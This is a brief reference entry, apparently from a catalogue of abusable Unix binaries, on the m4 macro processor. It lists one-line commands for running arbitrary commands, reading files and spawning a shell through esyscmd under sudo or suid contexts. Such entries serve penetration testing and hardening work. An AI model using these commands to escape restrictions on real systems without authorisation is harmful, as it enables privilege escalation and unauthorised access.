title: m4
html:
m4

Command Execution

Context: sudo, suid, unprivileged

echo 'esyscmd(/path/to/command)' | m4

File Read

Context: sudo, suid, unprivileged

m4 /path/to/input-file

Shell

Context: sudo, suid, unprivileged

echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
excerpt: m4 Command Execution Context: sudo, suid, unprivileged echo 'esyscmd(/path/to/command)' | m4 File Read Context: sudo, suid, unprivileged m4 /path/to/input-file Shell Context: sudo, suid, unp
